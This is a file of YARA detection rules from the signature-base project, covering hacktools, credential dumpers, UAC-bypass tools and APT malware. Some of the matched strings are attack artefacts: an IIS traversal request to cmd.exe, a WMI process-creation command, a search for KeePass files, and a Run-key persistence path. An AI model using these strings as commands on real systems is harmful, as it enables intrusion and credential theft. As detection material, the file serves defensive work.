rule SIGNATURE_BASE_Base64_PS1_Shellcode_2
{
	meta:
		description = "Detects Base64 encoded PS1 Shellcode"
		author = "Nick Carr, David Ledbetter"
		id = "7c3cec3b-a192-5bfd-b4f1-22b1afeb717e"
		date = "2018-11-14"
		modified = "2023-12-05"
		reference = "https://twitter.com/ItsReallyNick/status/1062601684566843392"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_ps1_shellcode.yar#L1-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "fac6f41965eb2209f1552763800d6a2b172f28cd29bb7586d180654aab1e6d56"
		score = 65
		quality = 85
		tags = ""

	strings:
		$substring = "AAAAYInlM"
		$pattern1 = "/OiCAAAAYInlM"
		$pattern2 = "/OiJAAAAYInlM"

	condition:
		$substring and 1 of ( $p* )
}

rule SIGNATURE_BASE_APT_APT34_PS_Malware_Apr19_1_2
{
	meta:
		description = "Detects APT34 PowerShell malware"
		author = "Florian Roth (Nextron Systems)"
		id = "6a082c5a-ee5b-5002-9148-61bbcfedfe68"
		date = "2019-04-17"
		modified = "2023-12-05"
		reference = "https://twitter.com/0xffff0800/status/1118406371165126656"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_oilrig.yar#L267-L283"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "afe203fdfcc9dcafb170bee972d45e66e5483a777112a00fa30516dfe81bbf88"
		score = 75
		quality = 85
		tags = ""
		hash1 = "b1d621091740e62c84fc8c62bcdad07873c8b61b83faba36097ef150fd6ec768"

	strings:
		$x1 = "= get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID" ascii
		$x2 = "Write-Host \"excepton occured!\"" ascii
		$s1 = "Start-Sleep -s 1;" fullword ascii
		$s2 = "Start-Sleep -m 100;" fullword ascii

	condition:
		1 of ( $x* ) or 2 of them
}

rule SIGNATURE_BASE_Windowscredentialeditor_2
{
	meta:
		description = "Windows Credential Editor"
		author = "Florian Roth"
		id = "1542c6e4-36b2-5272-85d0-43226869b43e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L20-L32"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "531a0bdc893d89b1c14deee11df95b430051cef07744a15b5d606e1c5378db97"
		score = 90
		quality = 85
		tags = ""
		threat_level = 10

	strings:
		$a = "extract the TGT session key"
		$b = "Windows Credentials Editor"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Portscanner_Simple_Jan14_2
{
	meta:
		description = "Auto-generated rule on file PortScanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3e8960ce-0428-51e1-b992-4fa09fee8520"
		date = "2025-04-14"
		modified = "2025-04-14"
		old_rule_name = "PortScanner"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L171-L183"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b381b9212282c0c650cb4b0323436c63"
		logic_hash = "c69269b227d46b5b970cfc094b3154b0a533b439b8ed492a2059025bc96d17a0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Scan Ports Every"
		$s3 = "Scan All Possible Ports!"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Moorer_Port_Scanner_2
{
	meta:
		description = "Auto-generated rule on file MooreR Port Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5d8fb83f-bed3-53d2-bd33-2158911dc7c8"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L204-L217"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "376304acdd0b0251c8b19fea20bb6f5b"
		logic_hash = "248f437964fc6f7836f6b4c87e1f35bb1bac25a1a484cdf1a4065e7efb823b51"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Description|"
		$s3 = "soft Visual Studio\\VB9yp"
		$s4 = "adj_fptan?4"
		$s7 = "DOWS\\SyMem32\\/o"

	condition:
		all of them
}

rule SIGNATURE_BASE_Netbios_Name_Scanner_2
{
	meta:
		description = "Auto-generated rule on file NetBIOS Name Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "03716e00-a969-5ab5-9be7-e8fc4272e40f"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L219-L231"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "888ba1d391e14c0a9c829f5a1964ca2c"
		logic_hash = "19b40a283b74317fece2f5be0ee3e38227d9631eebbc7efb0ea19056b52630f1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "IconEx"
		$s2 = "soft Visual Stu"
		$s4 = "NBTScanner!y&"

	condition:
		all of them
}

rule SIGNATURE_BASE_Cgisscan_Cgiscan_2
{
	meta:
		description = "Auto-generated rule on file CGIScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "60bd5038-a308-55fd-85bb-2c4183f1c951"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L247-L259"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "338820e4e8e7c943074d5a5bc832458a"
		logic_hash = "5bd856a77c53616cf78d093462f8b7ca5a5fb0924406a02941d86bdb015a1fbc"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Wang Products" fullword wide
		$s2 = "WSocketResolveHost: Cannot convert host address '%s'"
		$s3 = "tcp is the only protocol supported thru socks server"

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_IP_Stealing_Utilities_2
{
	meta:
		description = "Auto-generated rule on file IP Stealing Utilities.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3a947e9c-d707-5819-88f2-059585750048"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L261-L272"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "65646e10fb15a2940a37c5ab9f59c7fc"
		logic_hash = "38958edeee6e140e11267cdd7899ad517799dbce33ac267d51dea0f8aecfa1ee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "DarkKnight"
		$s9 = "IPStealerUtilities"

	condition:
		all of them
}

rule SIGNATURE_BASE_Superscan4_2
{
	meta:
		description = "Auto-generated rule on file SuperScan4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "bd353382-ffa2-56c5-b842-1ffc94d6849e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L274-L287"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "78f76428ede30e555044b83c47bc86f0"
		logic_hash = "7f76c59e85efac5c150f783606e2a9bdc8724c6afd9f9c6405d63f7467c72752"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = " td class=\"summO1\">"
		$s6 = "REM'EBAqRISE"
		$s7 = "CorExitProcess'msc#e"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portracer_2
{
	meta:
		description = "Auto-generated rule on file PortRacer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "54717938-2f4c-5442-b0ad-40b9acd1101a"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L288-L300"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2834a872a0a8da5b1be5db65dfdef388"
		logic_hash = "f6ad85a8970b10e25becca76e17bff30cbc787ed45f331af4ecf9563ff11b65d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Auto Scroll BOTH Text Boxes"
		$s4 = "Start/Stop Portscanning"
		$s6 = "Auto Save LogFile by pressing STOP"

	condition:
		all of them
}

rule SIGNATURE_BASE_Scanarator_2
{
	meta:
		description = "Auto-generated rule on file scanarator.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "dfc3ff29-03b4-58ca-bfe0-c6888fddab67"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L302-L312"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "848bd5a518e0b6c05bd29aceb8536c46"
		logic_hash = "9400435470c26245cd814e1e39f275eb22566d66d1a72d4f3e618a6ad11bc8d9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"

	condition:
		all of them
}

rule SIGNATURE_BASE_Aolipsniffer_2
{
	meta:
		description = "Auto-generated rule on file aolipsniffer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "f7cc0f31-6ba4-504b-82de-0334257b8a95"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L314-L332"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "51565754ea43d2d57b712d9f0a3e62b8"
		logic_hash = "e627b8ea85e4325714c98e93ad6147adfa600af548a80dce8548b7f5743733b5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
		$s1 = "dwGetAddressForObject"
		$s2 = "Color Transfer Settings"
		$s3 = "FX Global Lighting Angle"
		$s4 = "Version compatibility info"
		$s5 = "New Windows Thumbnail"
		$s6 = "Layer ID Generator Base"
		$s7 = "Color Halftone Settings"
		$s8 = "C:\\WINDOWS\\SYSTEM\\MSWINSCK.oca"

	condition:
		all of them
}

rule SIGNATURE_BASE__Bitchin_Threads__2
{
	meta:
		description = "Auto-generated rule on file =Bitchin Threads=.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3a51e76c-b360-5f10-961c-ecc3ea3fa3c9"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L334-L345"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7491b138c1ee5a0d9d141fbfd1f0071b"
		logic_hash = "f43fec37d9dc668b562838465e5696e502c638b207e7af6a77fac5a8b00e92a8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "DarKPaiN"
		$s1 = "=BITCHIN THREADS"

	condition:
		all of them
}

rule SIGNATURE_BASE_Cgis4_Cgis4_2
{
	meta:
		description = "Auto-generated rule on file cgis4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "98fbf445-b7a5-58fa-8f06-34be7321e2eb"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L347-L362"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d658dad1cd759d7f7d67da010e47ca23"
		logic_hash = "2cf3fc6447323cbefe5f5ad02271eeb4c271bb9784d2c29030858542a43fbb04"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ")PuMB_syJ"
		$s1 = "&,fARW>yR"
		$s2 = "m3hm3t_rullaz"
		$s3 = "7Projectc1"
		$s4 = "Ten-GGl\""
		$s5 = "/Moziqlxa"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portscan_2
{
	meta:
		description = "Auto-generated rule on file portscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "967d6e3b-ae0d-5f93-a20d-742fc010608d"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L364-L375"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a8bfdb2a925e89a281956b1e3bb32348"
		logic_hash = "d93b54ffc7416b5354304daf156908f11d7e320a91bd936e397a15ede63caae3"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s5 = "0    :SCAN BEGUN ON PORT:"
		$s6 = "0    :PORTSCAN READY."

	condition:
		all of them
}

rule SIGNATURE_BASE_Proport_Zip_Folder_Proport_2
{
	meta:
		description = "Auto-generated rule on file ProPort.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "cd611f6c-42ed-5cd3-a6ab-7e0970925e61"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L377-L394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c1937a86939d4d12d10fc44b7ab9ab27"
		logic_hash = "0ee2ffc5ed243d170b8013b3a164a3719f43bd473f4af7e1a2697d88a298fe9f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Corrupt Data!"
		$s1 = "K4p~omkIz"
		$s2 = "DllTrojanScan"
		$s3 = "GetDllInfo"
		$s4 = "Compressed by Petite (c)1999 Ian Luck."
		$s5 = "GetFileCRC32"
		$s6 = "GetTrojanNumber"
		$s7 = "TFAKAbout"

	condition:
		all of them
}

rule SIGNATURE_BASE_Stealthwasp_S_Basic_Portscanner_V1_2_2
{
	meta:
		description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "7f706186-f2e2-5d4d-951a-2ec8fc757cec"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L396-L407"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7c0f2cab134534cd35964fe4c6a1ff00"
		logic_hash = "b01c165b5e5be3ba6905e8bc44a14c3d7195effd058e4c0c31678777d19db8b5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Basic PortScanner"
		$s6 = "Now scanning port:"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bluesportscan_2
{
	meta:
		description = "Auto-generated rule on file BluesPortScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "4bcb8b7c-5e22-5496-9a29-66e85e3c3395"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L409-L420"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6292f5fc737511f91af5e35643fc9eef"
		logic_hash = "5cb4e4b87eaf166c85d23114f5abc10ef83b4a29968bf6fef4b3fce7ff2787fd"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "This program was made by Volker Voss"
		$s1 = "JiBOo~SSB"

	condition:
		all of them
}

rule SIGNATURE_BASE_Scanarator_Iis_2
{
	meta:
		description = "Auto-generated rule on file iis.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "a467147b-53c8-53db-aa33-5f0e4e066988"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L422-L433"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3a8fc02c62c8dd65e038cc03e5451b6e"
		logic_hash = "092cb902e10624b207b7932e6b3c1fe2277ed1d183e5de9ee4d07d8548e90ab6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "example: iis 10.10.10.10"
		$s1 = "send error"

	condition:
		all of them
}

rule SIGNATURE_BASE_Stealth_Stealth_2
{
	meta:
		description = "Auto-generated rule on file Stealth.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5f45882e-3e27-596d-8725-fad380e1c297"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L435-L446"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8ce3a386ce0eae10fc2ce0177bbc8ffa"
		logic_hash = "e210b1a553549c22f66511dfc9d0d3f5b17f02981b9e9915827bc909f34b3262"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "<table width=\"60%\" bgcolor=\"black\" cellspacing=\"0\" cellpadding=\"2\" border=\"1\" bordercolor=\"white\"><tr><td>"
		$s6 = "This tool may be used only by system administrators. I am not responsible for "

	condition:
		all of them
}

rule SIGNATURE_BASE_Angry_IP_Scanner_V2_08_Ipscan_2
{
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5fbcbb95-6cd4-5587-bf44-5b5ed133ce5e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L448-L460"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70cf2c09776a29c3e837cb79d291514a"
		logic_hash = "1b50856ad35c146a684298a86f1629c45996ab08ffae8486a388805262ec2367"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "_H/EnumDisplay/"
		$s5 = "ECTED.MSVCRT0x"
		$s8 = "NotSupported7"

	condition:
		all of them
}

rule SIGNATURE_BASE_Crack_Loader_2
{
	meta:
		description = "Auto-generated rule on file Loader.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "0c4c7b69-7739-5c1b-8c7c-4aaa724e4455"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L462-L473"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f4f79358a6c600c1f0ba1f7e4879a16d"
		logic_hash = "3380ace7c34c15dfd9a9625c8c4a1ed7e35c1cf3c2eca9b1e00dd0092d256150"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "NeoWait.exe"
		$s1 = "RRRRRRRW"

	condition:
		all of them
}

rule SIGNATURE_BASE_WCE_Modified_1_1014_2
{
	meta:
		description = "Modified (packed) version of Windows Credential Editor"
		author = "Florian Roth (Nextron Systems)"
		id = "536d1a7f-bda1-5c22-bf72-a177468e7c42"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L738-L752"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "09a412ac3c85cedce2642a19e99d8f903a2e0354"
		logic_hash = "f094d635aabea9b9101fad3d0d23ad37692317ae5b4f636296ee612752c4421f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "LSASS.EXE" fullword ascii
		$s1 = "_CREDS" ascii
		$s9 = "Using WCE " ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Bypassuac2_2
{
	meta:
		description = "Auto-generated rule - file BypassUac2.zip"
		author = "yarGen Yara Rule Generator"
		id = "8b7e49de-9b0a-5dc4-86af-1a854dc649cc"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L955-L967"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ef3e7dd2d1384ecec1a37254303959a43695df61"
		logic_hash = "398783fa0453a60fd1c6aa64eacfbfa7c5385e81c79d1b6a8a8386dae9b825cc"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "/BypassUac/BypassUac/BypassUac_Utils.cpp" fullword ascii
		$s1 = "/BypassUac/BypassUacDll/BypassUacDll.aps" fullword ascii
		$s3 = "/BypassUac/BypassUac/BypassUac.ico" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Bypassuacdll_6_2
{
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		id = "5be27053-446f-5ea3-a242-2661aeffa3df"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L1000-L1011"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
		logic_hash = "3cb89875ddf79a3709aeb58149e228e03b9fb43fa1565aab5ece743857b4cc71"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "BypassUacDLL.dll" fullword wide
		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Lazagne_Gen_18_2
{
	meta:
		description = "Detects Lazagne password extractor hacktool"
		author = "Florian Roth (Nextron Systems)"
		id = "034ea6d8-f5cf-5664-9ff9-24d19403093d"
		date = "2018-12-11"
		modified = "2025-04-14"
		reference = "https://creativecommons.org/licenses/by-nc/4.0/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L4572-L4589"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6f3e895080267a551a3b7a0ba2d4207b31befacbd35d1e6941e1b69d7e2689ce"
		score = 80
		quality = 85
		tags = ""
		hash1 = "51121dd5fbdfe8db7d3a5311e3e9c904d644ff7221b60284c03347938577eecf"

	strings:
		$x1 = "lazagne.config.powershell_execute(" ascii
		$x2 = "creddump7.win32." ascii
		$x3 = "lazagne.softwares.windows.hashdump" ascii
		$x4 = ".softwares.memory.libkeepass.common(" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_HKTL_Nopowershell_2
{
	meta:
		description = "Detects NoPowerShell hack tool"
		author = "Florian Roth (Nextron Systems)"
		id = "17d508d5-833f-5232-a071-dbed8758493b"
		date = "2018-12-28"
		modified = "2022-12-21"
		reference = "https://github.com/bitsadmin/nopowershell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L4591-L4608"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2207af9fcc61d547dfeff347a1eae2c59024a7270d1b8cbb7abef56d80864728"
		score = 75
		quality = 85
		tags = ""
		hash1 = "2dad091dd00625762a7590ce16c3492cbaeb756ad0e31352a42751deb7cf9e70"

	strings:
		$x1 = "\\NoPowerShell.pdb" ascii
		$x2 = "Invoke-WmiMethod -Class Win32_Process -Name Create \"cmd" fullword wide
		$x3 = "ls C:\\Windows\\System32 -Include *.exe | select -First 10 Name,Length" fullword wide
		$x4 = "ls -Recurse -Force C:\\Users\\ -Include *.kdbx" fullword wide
		$x5 = "NoPowerShell.exe" fullword wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_Hvs_APT27_Hyperbro_Stage3_Persistence_2
{
	meta:
		description = "HyperBro Stage 3 registry keys for persistence"
		author = "Marko Dorfhuber"
		id = "2bb1d28b-5fc4-5f0b-b546-c8b8192b0d48"
		date = "2022-02-07"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_apt27_hyperbro.yar#L103-L117"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "db4b7be2bafe29b5e7c81a90e17a660cf73cff1c2e8edd04a9421daba09e3e0e"
		score = 75
		quality = 85
		tags = ""
		hash1 = "624e85bd669b97bc55ed5c5ea5f6082a1d4900d235a5d2e2a5683a04e36213e8"

	strings:
		$ = "SOFTWARE\\WOW6432Node\\Microsoft\\config_" ascii
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\windefenders" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Irontiger_Wmiexec_2
{
	meta:
		description = "Iron Tiger Tool - wmi.vbs detection"
		author = "Cyber Safety Solutions, Trend Micro"
		id = "a3060f50-3594-5da9-98e2-6fa0087451f5"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://goo.gl/T5fSJC"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_irontiger_trendmicro.yar#L259-L276"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7988b993345e13b64e5f02ecd2679fc484b063a4cd2f18b52d00d2dfa34d82cb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$str1 = "Temp Result File , Change it to where you like" wide ascii
		$str2 = "wmiexec" wide ascii
		$str3 = "By. Twi1ight" wide ascii
		$str4 = "[both mode] ,delay TIME to read result" wide ascii
		$str5 = "such as nc.exe or Trojan" wide ascii
		$str6 = "+++shell mode+++" wide ascii
		$str7 = "win2008 fso has no privilege to delete file" wide ascii

	condition:
		2 of ( $str* )
}

rule SIGNATURE_BASE_HKTL_Redmimicry_Agent_2
{
	meta:
		description = "matches the RedMimicry agent executable and payload"
		author = "mirar@chaosmail.org"
		id = "a4d4ec77-4a0d-5afd-9181-85433e8b5fda"
		date = "2020-06-22"
		modified = "2023-01-06"
		reference = "https://redmimicry.com"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_redmimicry.yar#L2-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "645da2764ca911c4aae80b90622d2c61933dee929403858fc49f7bc0d44300c6"
		score = 75
		quality = 85
		tags = ""
		sharing = "tlp:white"

	strings:
		$reg0 = "HKEY_CURRENT_USER\\" ascii
		$reg1 = "HKEY_LOCAL_MACHINE\\" ascii
		$reg2 = "HKEY_CURRENT_CONFIG\\" ascii
		$reg3 = "HKEY_CLASSES_ROOT\\" ascii
		$cmd0 = "C:\\Windows\\System32\\cmd.exe" ascii fullword
		$lua0 = "client_recv" ascii fullword
		$lua1 = "client_send" ascii fullword
		$lua2 = "$LuaVersion: " ascii
		$sym0 = "VirtualAllocEx" wide fullword
		$sym1 = "kernel32.dll" wide fullword

	condition:
		all of them
}

